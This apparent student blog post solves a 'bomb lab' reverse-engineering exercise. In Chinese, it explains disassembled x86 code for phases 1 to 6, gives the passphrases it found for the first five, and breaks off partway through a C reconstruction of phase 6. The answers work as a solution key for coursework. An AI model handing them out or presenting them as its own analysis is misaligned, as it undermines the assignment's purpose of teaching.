8048b65: ff 75 08 pushl 0x8(%ebp) 8048b68: e8 65 05 00 00 call 80490d2 &lt;strings_not_equal&gt; 8048b6d: 83 c4 10 add $0x10,%esp 8048b70: 85 c0 test %eax,%eax 8048b72: 75 02 jne 8048b76 &lt;phase_1+0x1c&gt; 8048b74: c9 leave 8048b75: c3 ret 8048b76: e8 58 06 00 00 call 80491d3 &lt;explode_bomb&gt; 8048b7b: eb f7 jmp 8048b74 &lt;phase_1+0x1a&gt; 从8048b60-8048b68可以看出这里将我们这关(phase_1)填的内容（ 0x8(%ebp) ) 和0x804a144处的内容传给了80490d2处的一个函数，出后面的解释可以看出这个函数的功能是判断输入的两个字符串是否相同，test %eax,%eax这句应该是返回的判断结果，如果不相等就跳到8048b76处（bomb函数），所以要过关就要使我们填入的内容与0x804a144处的内容一样（使返回判断结果相同），在gdb中用x/s 0x804a144 查看得知本关的密码是:I turned the moon into something I call a Death Star. 第二关： 123456789101112131415161718192021222324252627282930313233343508048b7d &lt;phase_2&gt;: 8048b7d: 55 push %ebp 8048b7e: 89 e5 mov %esp,%ebp 8048b80: 53 push %ebx 8048b81: 83 ec 2c sub $0x2c,%esp 8048b84: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048b8a: 89 45 f4 mov %eax,-0xc(%ebp) 8048b8d: 31 c0 xor %eax,%eax 8048b8f: 8d 45 dc lea -0x24(%ebp),%eax 8048b92: 50 push %eax 8048b93: ff 75 08 pushl 0x8(%ebp) 8048b96: e8 60 06 00 00 call 80491fb &lt;read_six_numbers&gt; 8048b9b: 83 c4 10 add $0x10,%esp 8048b9e: 83 7d dc 00 cmpl $0x0,-0x24(%ebp) 8048ba2: 78 07 js 8048bab &lt;phase_2+0x2e&gt; 8048ba4: bb 01 00 00 00 mov $0x1,%ebx 8048ba9: eb 0f jmp 8048bba &lt;phase_2+0x3d&gt; 8048bab: e8 23 06 00 00 call 80491d3 &lt;explode_bomb&gt; 8048bb0: eb f2 jmp 8048ba4 &lt;phase_2+0x27&gt; 8048bb2: 83 c3 01 add $0x1,%ebx 8048bb5: 83 fb 06 cmp $0x6,%ebx 8048bb8: 74 13 je 8048bcd &lt;phase_2+0x50&gt; 8048bba: 89 d8 mov %ebx,%eax 8048bbc: 03 44 9d d8 add -0x28(%ebp,%ebx,4),%eax 8048bc0: 39 44 9d dc cmp %eax,-0x24(%ebp,%ebx,4) 8048bc4: 74 ec je 8048bb2 &lt;phase_2+0x35&gt; 8048bc6: e8 08 06 00 00 call 80491d3 &lt;explode_bomb&gt; 8048bcb: eb e5 jmp 8048bb2 &lt;phase_2+0x35&gt; 8048bcd: 8b 45 f4 mov -0xc(%ebp),%eax 8048bd0: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048bd7: 75 05 jne 8048bde &lt;phase_2+0x61&gt; 8048bd9: 8b 5d fc mov -0x4(%ebp),%ebx 8048bdc: c9 leave 8048bdd: c3 ret 8048bde: e8 ad fb ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 结合之前的经验可以知道，本关要求输入6个数字，结合汇编内容可以知道本关对数组的要求满足A[i+1]=A[i]+i+1,从cmpl $0x0,-0x24(%ebp) js 可知要求A[0]&gt;=0,所以选了1 2 4 7 11 16作为答案 第三关： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848508048be3 &lt;phase_3&gt;: 8048be3: 55 push %ebp 8048be4: 89 e5 mov %esp,%ebp 8048be6: 83 ec 24 sub $0x24,%esp 8048be9: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048bef: 89 45 f4 mov %eax,-0xc(%ebp) 8048bf2: 31 c0 xor %eax,%eax 8048bf4: 8d 45 f0 lea -0x10(%ebp),%eax 8048bf7: 50 push %eax 8048bf8: 8d 45 eb lea -0x15(%ebp),%eax 8048bfb: 50 push %eax 8048bfc: 8d 45 ec lea -0x14(%ebp),%eax 8048bff: 50 push %eax 8048c00: 68 a2 a1 04 08 push $0x804a1a2 8048c05: ff 75 08 pushl 0x8(%ebp) 8048c08: e8 03 fc ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 8048c0d: 83 c4 20 add $0x20,%esp 8048c10: 83 f8 02 cmp $0x2,%eax 8048c13: 7e 14 jle 8048c29 &lt;phase_3+0x46&gt; 8048c15: 83 7d ec 07 cmpl $0x7,-0x14(%ebp) 8048c19: 0f 87 f0 00 00 00 ja 8048d0f &lt;phase_3+0x12c&gt; 8048c1f: 8b 45 ec mov -0x14(%ebp),%eax 8048c22: ff 24 85 c0 a1 04 08 jmp *0x804a1c0(,%eax,4) 8048c29: e8 a5 05 00 00 call 80491d3 &lt;explode_bomb&gt; 8048c2e: eb e5 jmp 8048c15 &lt;phase_3+0x32&gt; 8048c30: b8 68 00 00 00 mov $0x68,%eax 8048c35: 81 7d f0 e3 01 00 00 cmpl $0x1e3,-0x10(%ebp) 8048c3c: 0f 84 d7 00 00 00 je 8048d19 &lt;phase_3+0x136&gt; 8048c42: e8 8c 05 00 00 call 80491d3 &lt;explode_bomb&gt; 8048c47: b8 68 00 00 00 mov $0x68,%eax 8048c4c: e9 c8 00 00 00 jmp 8048d19 &lt;phase_3+0x136&gt; 8048c51: b8 6e 00 00 00 mov $0x6e,%eax 8048c56: 81 7d f0 11 03 00 00 cmpl $0x311,-0x10(%ebp) 8048c5d: 0f 84 b6 00 00 00 je 8048d19 &lt;phase_3+0x136&gt; 8048c63: e8 6b 05 00 00 call 80491d3 &lt;explode_bomb&gt; 8048c68: b8 6e 00 00 00 mov $0x6e,%eax 8048c6d: e9 a7 00 00 00 jmp 8048d19 &lt;phase_3+0x136&gt; 8048c72: b8 66 00 00 00 mov $0x66,%eax 8048c77: 83 7d f0 58 cmpl $0x58,-0x10(%ebp) 8048c7b: 0f 84 98 00 00 00 je 8048d19 &lt;phase_3+0x136&gt; 8048c81: e8 4d 05 00 00 call 80491d3 &lt;explode_bomb&gt; 8048c86: b8 66 00 00 00 mov $0x66,%eax 8048c8b: e9 89 00 00 00 jmp 8048d19 &lt;phase_3+0x136&gt; 8048c90: b8 70 00 00 00 mov $0x70,%eax 8048c95: 83 7d f0 72 cmpl $0x72,-0x10(%ebp) 8048c99: 74 7e je 8048d19 &lt;phase_3+0x136&gt; 8048c9b: e8 33 05 00 00 call 80491d3 &lt;explode_bomb&gt; 8048ca0: b8 70 00 00 00 mov $0x70,%eax 8048ca5: eb 72 jmp 8048d19 &lt;phase_3+0x136&gt; 8048ca7: b8 6f 00 00 00 mov $0x6f,%eax 8048cac: 81 7d f0 ba 03 00 00 cmpl $0x3ba,-0x10(%ebp) 8048cb3: 74 64 je 8048d19 &lt;phase_3+0x136&gt; 8048cb5: e8 19 05 00 00 call 80491d3 &lt;explode_bomb&gt; 8048cba: b8 6f 00 00 00 mov $0x6f,%eax 8048cbf: eb 58 jmp 8048d19 &lt;phase_3+0x136&gt; 8048cc1: b8 70 00 00 00 mov $0x70,%eax 8048cc6: 81 7d f0 66 01 00 00 cmpl $0x166,-0x10(%ebp) 8048ccd: 74 4a je 8048d19 &lt;phase_3+0x136&gt; 8048ccf: e8 ff 04 00 00 call 80491d3 &lt;explode_bomb&gt; 8048cd4: b8 70 00 00 00 mov $0x70,%eax 8048cd9: eb 3e jmp 8048d19 &lt;phase_3+0x136&gt; 8048cdb: b8 6c 00 00 00 mov $0x6c,%eax 8048ce0: 81 7d f0 01 03 00 00 cmpl $0x301,-0x10(%ebp) 8048ce7: 74 30 je 8048d19 &lt;phase_3+0x136&gt; 8048ce9: e8 e5 04 00 00 call 80491d3 &lt;explode_bomb&gt; 8048cee: b8 6c 00 00 00 mov $0x6c,%eax 8048cf3: eb 24 jmp 8048d19 &lt;phase_3+0x136&gt; 8048cf5: b8 6a 00 00 00 mov $0x6a,%eax 8048cfa: 81 7d f0 36 02 00 00 cmpl $0x236,-0x10(%ebp) 8048d01: 74 16 je 8048d19 &lt;phase_3+0x136&gt; 8048d03: e8 cb 04 00 00 call 80491d3 &lt;explode_bomb&gt; 8048d08: b8 6a 00 00 00 mov $0x6a,%eax 8048d0d: eb 0a jmp 8048d19 &lt;phase_3+0x136&gt; 8048d0f: e8 bf 04 00 00 call 80491d3 &lt;explode_bomb&gt; 8048d14: b8 79 00 00 00 mov $0x79,%eax 8048d19: 38 45 eb cmp %al,-0x15(%ebp) 8048d1c: 74 05 je 8048d23 &lt;phase_3+0x140&gt; 8048d1e: e8 b0 04 00 00 call 80491d3 &lt;explode_bomb&gt; 8048d23: 8b 45 f4 mov -0xc(%ebp),%eax 8048d26: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048d2d: 75 02 jne 8048d31 &lt;phase_3+0x14e&gt; 8048d2f: c9 leave 8048d30: c3 ret 8048d31: e8 5a fa ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 从8048c08:call 8048810 &lt;__isoc99_sscanf@plt&gt;，可以看出在出处调用了一个函数，在一个博主的个人博客里看到他是这样解释的：“猜测sscanf可能是C语言的内部函数，于是查到其定义为：int sscanf(const char *str, const char format,…)，给出一个使用实例：sscanf(“s 1”, “%s %d”, str, &amp;a)，函数返回2（因为接收了2个参数），str为char类型，保存”s”；a为int类型，保存1。”这里可以看出，sscanf的第二个参数为输入答案要求的类型和个数，再看反汇编部分可知sscanf的第二个参数为 $0x804a1a2处的内容，gdb中在phase_3设断点，可查$0x804a1a2处的内容为“%d %c %d”，所以第三关要求输入两个整数，一个字符.从cmp $0x2,%eax ，jle 8048c29 &lt;phase_3+0x46&gt;（bomb）两局也可以看出要求输入三个参数。 123456788048bf4: 8d 45 f0 lea -0x10(%ebp),%eax8048bf7: 50 push %eax8048bf8: 8d 45 eb lea -0x15(%ebp),%eax8048bfb: 50 push %eax8048bfc: 8d 45 ec lea -0x14(%ebp),%eax8048bff: 50 push %eax8048c00: 68 a2 a1 04 08 push $0x804a1a28048c05: ff 75 08 pushl 0x8(%ebp) 上面几行是sscanf的参数：0x8(%ebp)是phase_3的参数，也就是本关要输入的密码，$0x804a1a2是输入数据的类型，lea -0x14(%ebp),%eax，lea -0x15(%ebp),%eax，lea -0x10(%ebp),%eax，则对应0x8(%ebp)的第一，二，三个数据，即： -0x14(%ebp)–&gt;data1(int) -0x15(%ebp)–&gt;data2(char) -0x10(%ebp)–&gt;data3(int) 接着读， 128048c15: 83 7d ec 07 cmpl $0x7,-0x14(%ebp) 8048c19: 0f 87 f0 00 00 00 ja 8048d0f &lt;phase_3+0x12c&gt;&#x2F;&#x2F;（bomb) 这里看到过关的一个条件:data1&lt;7，接着看 128048c1f: 8b 45 ec mov -0x14(%ebp),%eax8048c22: ff 24 85 c0 a1 04 08 jmp *0x804a1c0(,%eax,4) 可以看出eax里是data1，所以是跳转到（0x804a1c0+4data1),在gdb中查看data1在合理取值的跳转位置： 1234567*(0x804a1c0+0)&#x3D;0x8048c30;*(0x804a1c0+4)&#x3D;0x8048c51;*(0x804a1c0+8)&#x3D;0x8048c72;*(0x804a1c0+12)&#x3D;0x8048c90;*(0x804a1c0+16)&#x3D;0x8048ca7;*(0x804a1c0+20)&#x3D;0x8048cc1;*(0x804a1c0+24)&#x3D;0x8048cdb; 本着快速过关的想法，我就看了data1=0时的情况： 12348048c30: b8 68 00 00 00 mov $0x68,%eax8048c35: 81 7d f0 e3 01 00 00 cmpl $0x1e3,-0x10(%ebp)8048c3c: 0f 84 d7 00 00 00 je 8048d19 &lt;phase_3+0x136&gt;8048c42: e8 8c 05 00 00 call 80491d3 &lt;explode_bomb&gt; 第二行是通关的一个条件：data3 = 0x1e3（483D），然后再跳一次： 123456788048d19: 38 45 eb cmp %al,-0x15(%ebp)8048d1c: 74 05 je 8048d23 &lt;phase_3+0x140&gt;8048d1e: e8 b0 04 00 00 call 80491d3 &lt;explode_bomb&gt;8048d23: 8b 45 f4 mov -0xc(%ebp),%eax8048d26: 65 33 05 14 00 00 00 xor %gs:0x14,%eax8048d2d: 75 02 jne 8048d31 &lt;phase_3+0x14e&gt;8048d2f: c9 leave 8048d30: c3 ret 这里是第三个通关条件，要求data2 = %al。这个 al 寄存器当初看课的时候没有太留意，当时做到这里，因为不认识，这个al耽误了我一天的时间。。。。。。当时没看老师讲实验的直播，群里的聊天记录做实验时看了看，但是没得到什么有用的信息，所以就没有装32位的lib库，导致我不能跑bobm，所以当时想了半天反应过来直接查寄存器内容的想法也没实现，在查了许久的百度终于查到，eax的低8位，查到时就反应过来袁春风老师视频里好像是讲过的，想到这里流下了不学无数的眼泪。。。。。。前面mov $0x68,%eax看到eax内容为0x68（01101000B=104D）因为data2是char类型的,查看ascii表知道‘h’的值为104，所以本关的答案之一：0 h 483 第四关： 1234567891011121314151617181920212223242526272829303132333435363708048d93 &lt;phase_4&gt;: 8048d93: 55 push %ebp 8048d94: 89 e5 mov %esp,%ebp 8048d96: 83 ec 18 sub $0x18,%esp 8048d99: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048d9f: 89 45 f4 mov %eax,-0xc(%ebp) 8048da2: 31 c0 xor %eax,%eax 8048da4: 8d 45 f0 lea -0x10(%ebp),%eax 8048da7: 50 push %eax 8048da8: 8d 45 ec lea -0x14(%ebp),%eax 8048dab: 50 push %eax 8048dac: 68 2f a3 04 08 push $0x804a32f 8048db1: ff 75 08 pushl 0x8(%ebp) 8048db4: e8 57 fa ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 8048db9: 83 c4 10 add $0x10,%esp 8048dbc: 83 f8 02 cmp $0x2,%eax 8048dbf: 75 06 jne 8048dc7 &lt;phase_4+0x34&gt; 8048dc1: 83 7d ec 0e cmpl $0xe,-0x14(%ebp) 8048dc5: 76 05 jbe 8048dcc &lt;phase_4+0x39&gt; 8048dc7: e8 07 04 00 00 call 80491d3 &lt;explode_bomb&gt; 8048dcc: 83 ec 04 sub $0x4,%esp 8048dcf: 6a 0e push $0xe 8048dd1: 6a 00 push $0x0 8048dd3: ff 75 ec pushl -0x14(%ebp) 8048dd6: e8 5b ff ff ff call 8048d36 &lt;func4&gt; 8048ddb: 83 c4 10 add $0x10,%esp 8048dde: 83 f8 06 cmp $0x6,%eax 8048de1: 75 06 jne 8048de9 &lt;phase_4+0x56&gt; 8048de3: 83 7d f0 06 cmpl $0x6,-0x10(%ebp) 8048de7: 74 05 je 8048dee &lt;phase_4+0x5b&gt; 8048de9: e8 e5 03 00 00 call 80491d3 &lt;explode_bomb&gt; 8048dee: 8b 45 f4 mov -0xc(%ebp),%eax 8048df1: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048df8: 75 02 jne 8048dfc &lt;phase_4+0x69&gt; 8048dfa: c9 leave 8048dfb: c3 ret 8048dfc: e8 8f f9 ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 根据上面的经验，先看0x804a32f的内容，gdb中查看是“%d %d”，然后读： 1238048dc1: 83 7d ec 0e cmpl $0xe,-0x14(%ebp)8048dc5: 76 05 jbe 8048dcc &lt;phase_4+0x39&gt;8048dc7: e8 07 04 00 00 call 80491d3 &lt;explode_bomb&gt; 看出条件1：data1&lt;=14,然后就是对func4的调用： 12348048dd6: e8 5b ff ff ff call 8048d36 &lt;func4&gt; 8048ddb: 83 c4 10 add $0x10,%esp 8048dde: 83 f8 06 cmp $0x6,%eax 8048de1: 75 06 jne 8048de9 &lt;phase_4+0x56&gt;（bomb） 可以看到条件2：func4返回值（%eax）要为6， 128048de3: 83 7d f0 06 cmpl $0x6,-0x10(%ebp)8048de7: 74 05 je 8048dee &lt;phase_4+0x5b&gt; 可以知道条件3：data2=6，满足这3个条件就可以过关了。主要还是func4的内容： 1234567891011121314151617181920212223242526272829303132333435363738394008048d36 &lt;func4&gt;: 8048d36: 55 push %ebp 8048d37: 89 e5 mov %esp,%ebp 8048d39: 53 push %ebx 8048d3a: 83 ec 04 sub $0x4,%esp 8048d3d: 8b 4d 08 mov 0x8(%ebp),%ecx 8048d40: 8b 45 0c mov 0xc(%ebp),%eax 8048d43: 8b 5d 10 mov 0x10(%ebp),%ebx 8048d46: 29 c3 sub %eax,%ebx 8048d48: 89 da mov %ebx,%edx 8048d4a: c1 ea 1f shr $0x1f,%edx 8048d4d: 01 da add %ebx,%edx 8048d4f: d1 fa sar %edx 8048d51: 01 c2 add %eax,%edx 8048d53: 39 ca cmp %ecx,%edx 8048d55: 7f 0e jg 8048d65 &lt;func4+0x2f&gt; 8048d57: b8 00 00 00 00 mov $0x0,%eax 8048d5c: 39 ca cmp %ecx,%edx 8048d5e: 7c 1a jl 8048d7a &lt;func4+0x44&gt; 8048d60: 8b 5d fc mov -0x4(%ebp),%ebx 8048d63: c9 leave 8048d64: c3 ret 8048d65: 83 ec 04 sub $0x4,%esp 8048d68: 83 ea 01 sub $0x1,%edx 8048d6b: 52 push %edx 8048d6c: 50 push %eax 8048d6d: 51 push %ecx 8048d6e: e8 c3 ff ff ff call 8048d36 &lt;func4&gt; 8048d73: 83 c4 10 add $0x10,%esp 8048d76: 01 c0 add %eax,%eax 8048d78: eb e6 jmp 8048d60 &lt;func4+0x2a&gt; 8048d7a: 83 ec 04 sub $0x4,%esp 8048d7d: ff 75 10 pushl 0x10(%ebp) 8048d80: 83 c2 01 add $0x1,%edx 8048d83: 52 push %edx 8048d84: 51 push %ecx 8048d85: e8 ac ff ff ff call 8048d36 &lt;func4&gt; 8048d8a: 83 c4 10 add $0x10,%esp 8048d8d: 8d 44 00 01 lea 0x1(%eax,%eax,1),%eax 8048d91: eb cd jmp 8048d60 &lt;func4+0x2a&gt; 这里就不一步步的分析了，主要是func4里都是各种跳转和过程调用，不太好描述，这里给出自己修了几版的func4的c语言版（这里吐槽一下，因为自己对eax寄存器里存放函数返回值这个点理解的不透彻，所以真的是把这点内容改了好几遍）： 1234567891011121314int func4(int a,int b,int c)&#123; c&#x3D;c-b; int t&#x3D;c; t&#x3D;t&gt;&gt;31; t+&#x3D;c; t&#x3D;t&#x2F;2; t+&#x3D;b; if(a&lt;t) return 2*fun(t-1,b,a); else if(a&gt;t) return 2*fun(c1,t+1,a)+1; return 0;&#125; 根据data2=6，倒推data1为6.所以本关答案：6 6第4关的内容是递归，因为自己对递归的过程不是那么的理解，而且对过程调用的一些细节了解的不是那么透，所以当时做的时候还是比较头疼的。 第五关： 1234567891011121314151617181920212223242526272829303132333435363738394041424308048e01 &lt;phase_5&gt;: 8048e01: 55 push %ebp 8048e02: 89 e5 mov %esp,%ebp 8048e04: 83 ec 18 sub $0x18,%esp 8048e07: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048e0d: 89 45 f4 mov %eax,-0xc(%ebp) 8048e10: 31 c0 xor %eax,%eax 8048e12: 8d 45 f0 lea -0x10(%ebp),%eax 8048e15: 50 push %eax 8048e16: 8d 45 ec lea -0x14(%ebp),%eax 8048e19: 50 push %eax 8048e1a: 68 2f a3 04 08 push $0x804a32f 8048e1f: ff 75 08 pushl 0x8(%ebp) 8048e22: e8 e9 f9 ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 8048e27: 83 c4 10 add $0x10,%esp 8048e2a: 83 f8 01 cmp $0x1,%eax 8048e2d: 7e 4d jle 8048e7c &lt;phase_5+0x7b&gt; 8048e2f: 8b 45 ec mov -0x14(%ebp),%eax 8048e32: 83 e0 0f and $0xf,%eax 8048e35: 89 45 ec mov %eax,-0x14(%ebp) 8048e38: 83 f8 0f cmp $0xf,%eax 8048e3b: 74 2c je 8048e69 &lt;phase_5+0x68&gt; 8048e3d: b9 00 00 00 00 mov $0x0,%ecx 8048e42: ba 00 00 00 00 mov $0x0,%edx 8048e47: 83 c2 01 add $0x1,%edx 8048e4a: 8b 04 85 e0 a1 04 08 mov 0x804a1e0(,%eax,4),%eax 8048e51: 01 c1 add %eax,%ecx 8048e53: 83 f8 0f cmp $0xf,%eax 8048e56: 75 ef jne 8048e47 &lt;phase_5+0x46&gt; 8048e58: c7 45 ec 0f 00 00 00 movl $0xf,-0x14(%ebp) 8048e5f: 83 fa 0f cmp $0xf,%edx 8048e62: 75 05 jne 8048e69 &lt;phase_5+0x68&gt; 8048e64: 39 4d f0 cmp %ecx,-0x10(%ebp) 8048e67: 74 05 je 8048e6e &lt;phase_5+0x6d&gt; 8048e69: e8 65 03 00 00 call 80491d3 &lt;explode_bomb&gt; 8048e6e: 8b 45 f4 mov -0xc(%ebp),%eax 8048e71: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048e78: 75 09 jne 8048e83 &lt;phase_5+0x82&gt; 8048e7a: c9 leave 8048e7b: c3 ret 8048e7c: e8 52 03 00 00 call 80491d3 &lt;explode_bomb&gt; 8048e81: eb ac jmp 8048e2f &lt;phase_5+0x2e&gt; 8048e83: e8 08 f9 ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 第五关好像主要是循环，当时也没用多久就搞定了，感觉应该把这关放到前面一点。结合前面的内容，想看输入的格式$0x804a32f处内容为“%d %d”,-0x14(%ebp)–&gt;data1-0x10(%ebp)–&gt;data2看下面： 123458048e2f: 8b 45 ec mov -0x14(%ebp),%eax 8048e32: 83 e0 0f and $0xf,%eax 8048e35: 89 45 ec mov %eax,-0x14(%ebp) 8048e38: 83 f8 0f cmp $0xf,%eax 8048e3b: 74 2c je 8048e69 &lt;phase_5+0x68&gt; 这里有一个条件：data1！=15接着看： 123456789108048e3d: b9 00 00 00 00 mov $0x0,%ecx8048e42: ba 00 00 00 00 mov $0x0,%edx8048e47: 83 c2 01 add $0x1,%edx8048e4a: 8b 04 85 e0 a1 04 08 mov 0x804a1e0(,%eax,4),%eax8048e51: 01 c1 add %eax,%ecx8048e53: 83 f8 0f cmp $0xf,%eax8048e56: 75 ef jne 8048e47 &lt;phase_5+0x46&gt;8048e58: c7 45 ec 0f 00 00 00 movl $0xf,-0x14(%ebp)8048e5f: 83 fa 0f cmp $0xf,%edx8048e62: 75 05 jne 8048e69 &lt;phase_5+0x68&gt;（bomb） 这里的内容是个循环，循环变量是%eax，当%eax=15时跳出循环，而且下面时出现了一个新的条件%edx=15，而循环开始时%edx=1，每循环一次%exd+1，所以第二个条件相当于要求循环15次，循环内容是%eax=（0x804a1e0+eax4），%exc+=%eax,这时gdb中查看0x804a1e0处及其之后的内容，在gdb中用x/x 0x804a1e0指令时显示0x804a1e0&lt;array.3035&gt;:10,这里猜0x8048a1e0是一个数组的首地址，然后就一次查看多个内存单元，最终看到这个数组长度为16x/16u 0x804a1e0显示结果：0x804a1e0&lt;array.3035&gt; :10 2 14 70x804a1e0&lt;array.3035+16&gt;:8 12 15 110x804a1e0&lt;array.3035+32&gt;:0 4 1 130x804a1e0&lt;array.3035+48&gt;:3 9 6 5这里对%eax=（0x804a1e0+eax4）表达式分析，可以看出eax内容是会循环的，假设eax初值为A[0]=10,这个循环为：A[0]-&gt;A[10]-&gt;A[1]-&gt;A[2]-&gt;A[14]-&gt;A[6]-&gt;A[15]-&gt;A[5]-&gt;A[12]-&gt;A[3]-&gt;A[7]-&gt;A[11]-&gt;A[13]-&gt;A[9]-&gt;A[4]-&gt;A[8]-&gt;A[0]要求循环15次，切结束循环时%eax=15则%eax初值为A[5],所以第一个%eax=（0x804a1e0+eax4）=A[5]所以%eax=5,而此时eax内存放data1的值，所以data1=5,ecx的内容为eax内容的累加，所以%ecx=A[5]+A[12]+A[3]+A[7]+A[11]+A[13]+A[9]+A[4]+A[8]+A[0]+A[10]+A[1]+A[2]+A[14]+A[6]，可以看到数值的内容是1–15，而%ecx是数组之和减A[15],即%ecx=（0+15）*16/2-5=115 1234567898048e64: 39 4d f0 cmp %ecx,-0x10(%ebp) 8048e67: 74 05 je 8048e6e &lt;phase_5+0x6d&gt; 8048e69: e8 65 03 00 00 call 80491d3 &lt;explode_bomb&gt; 8048e6e: 8b 45 f4 mov -0xc(%ebp),%eax 8048e71: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048e78: 75 09 jne 8048e83 &lt;phase_5+0x82&gt; 8048e7a: c9 leave 8048e7b: c3 ret 结尾部分是最后一个条件：data2 = %ecx，所以本关答案为 5 115第六关： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687 08048e88 &lt;phase_6&gt;: 8048e88: 55 push %ebp 8048e89: 89 e5 mov %esp,%ebp 8048e8b: 56 push %esi 8048e8c: 53 push %ebx 8048e8d: 83 ec 48 sub $0x48,%esp 8048e90: 65 a1 14 00 00 00 mov %gs:0x14,%eax 8048e96: 89 45 f4 mov %eax,-0xc(%ebp) 8048e99: 31 c0 xor %eax,%eax 8048e9b: 8d 45 c4 lea -0x3c(%ebp),%eax 8048e9e: 50 push %eax 8048e9f: ff 75 08 pushl 0x8(%ebp) 8048ea2: e8 54 03 00 00 call 80491fb &lt;read_six_numbers&gt; 8048ea7: 83 c4 10 add $0x10,%esp 8048eaa: be 00 00 00 00 mov $0x0,%esi 8048eaf: 8b 44 b5 c4 mov -0x3c(%ebp,%esi,4),%eax 8048eb3: 83 e8 01 sub $0x1,%eax 8048eb6: 83 f8 05 cmp $0x5,%eax 8048eb9: 77 0c ja 8048ec7 &lt;phase_6+0x3f&gt; 8048ebb: 83 c6 01 add $0x1,%esi 8048ebe: 83 fe 06 cmp $0x6,%esi 8048ec1: 74 51 je 8048f14 &lt;phase_6+0x8c&gt; 8048ec3: 89 f3 mov %esi,%ebx 8048ec5: eb 0f jmp 8048ed6 &lt;phase_6+0x4e&gt; 8048ec7: e8 07 03 00 00 call 80491d3 &lt;explode_bomb&gt; 8048ecc: eb ed jmp 8048ebb &lt;phase_6+0x33&gt; 8048ece: 83 c3 01 add $0x1,%ebx 8048ed1: 83 fb 05 cmp $0x5,%ebx 8048ed4: 7f d9 jg 8048eaf &lt;phase_6+0x27&gt; 8048ed6: 8b 44 9d c4 mov -0x3c(%ebp,%ebx,4),%eax 8048eda: 39 44 b5 c0 cmp %eax,-0x40(%ebp,%esi,4) 8048ede: 75 ee jne 8048ece &lt;phase_6+0x46&gt; 8048ee0: e8 ee 02 00 00 call 80491d3 &lt;explode_bomb&gt; 8048ee5: eb e7 jmp 8048ece &lt;phase_6+0x46&gt; 8048ee7: 8b 52 08 mov 0x8(%edx),%edx 8048eea: 83 c0 01 add $0x1,%eax 8048eed: 39 c8 cmp %ecx,%eax 8048eef: 75 f6 jne 8048ee7 &lt;phase_6+0x5f&gt; 8048ef1: 89 54 b5 dc mov %edx,-0x24(%ebp,%esi,4) 8048ef5: 83 c3 01 add $0x1,%ebx 8048ef8: 83 fb 06 cmp $0x6,%ebx 8048efb: 74 1e je 8048f1b &lt;phase_6+0x93&gt; 8048efd: 89 de mov %ebx,%esi 8048eff: 8b 4c 9d c4 mov -0x3c(%ebp,%ebx,4),%ecx 8048f03: b8 01 00 00 00 mov $0x1,%eax 8048f08: ba 3c c1 04 08 mov $0x804c13c,%edx 8048f0d: 83 f9 01 cmp $0x1,%ecx 8048f10: 7f d5 jg 8048ee7 &lt;phase_6+0x5f&gt; 8048f12: eb dd jmp 8048ef1 &lt;phase_6+0x69&gt; 8048f14: bb 00 00 00 00 mov $0x0,%ebx 8048f19: eb e2 jmp 8048efd &lt;phase_6+0x75&gt; 8048f1b: 8b 5d dc mov -0x24(%ebp),%ebx 8048f1e: 8b 45 e0 mov -0x20(%ebp),%eax 8048f21: 89 43 08 mov %eax,0x8(%ebx) 8048f24: 8b 55 e4 mov -0x1c(%ebp),%edx 8048f27: 89 50 08 mov %edx,0x8(%eax) 8048f2a: 8b 45 e8 mov -0x18(%ebp),%eax 8048f2d: 89 42 08 mov %eax,0x8(%edx) 8048f30: 8b 55 ec mov -0x14(%ebp),%edx 8048f33: 89 50 08 mov %edx,0x8(%eax) 8048f36: 8b 45 f0 mov -0x10(%ebp),%eax 8048f39: 89 42 08 mov %eax,0x8(%edx) 8048f3c: c7 40 08 00 00 00 00 movl $0x0,0x8(%eax) 8048f43: be 05 00 00 00 mov $0x5,%esi 8048f48: eb 08 jmp 8048f52 &lt;phase_6+0xca&gt; 8048f4a: 8b 5b 08 mov 0x8(%ebx),%ebx 8048f4d: 83 ee 01 sub $0x1,%esi 8048f50: 74 10 je 8048f62 &lt;phase_6+0xda&gt; 8048f52: 8b 43 08 mov 0x8(%ebx),%eax 8048f55: 8b 00 mov (%eax),%eax 8048f57: 39 03 cmp %eax,(%ebx) 8048f59: 7d ef jge 8048f4a &lt;phase_6+0xc2&gt; 8048f5b: e8 73 02 00 00 call 80491d3 &lt;explode_bomb&gt; 8048f60: eb e8 jmp 8048f4a &lt;phase_6+0xc2&gt; 8048f62: 8b 45 f4 mov -0xc(%ebp),%eax 8048f65: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048f6c: 75 07 jne 8048f75 &lt;phase_6+0xed&gt; 8048f6e: 8d 65 f8 lea -0x8(%ebp),%esp 8048f71: 5b pop %ebx 8048f72: 5e pop %esi 8048f73: 5d pop %ebp 8048f74: c3 ret 8048f75: e8 16 f8 ff ff call 8048790 &lt;__stack_chk_fail@plt&gt;8048e9b: 8d 45 c4 lea -0x3c(%ebp),%eax 8048e9e: 50 push %eax 8048e9f: ff 75 08 pushl 0x8(%ebp) 8048ea2: e8 54 03 00 00 call 80491fb &lt;read_six_numbers&gt; 本关是输入长度为6的数组，首地址为-0x3c(%ebp),由于本关的条件判断，还有跳转太多了，所以就不一一分析了，下面给出自己写的phase_6的c语言版： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657phase_6(int A*)&#123; int a&#x3D;0,ret,t,t1; int i&#x3D;0; while(true)&#123; ret&#x3D;A[i]; if(A[i]&lt;&#x3D;6)&#123;&#x2F;&#x2F;** i&#x3D;i+1; if(i&#x3D;&#x3D;6) break; a&#x3D;i; while(true)&#123; ret&#x3D;A[a]; 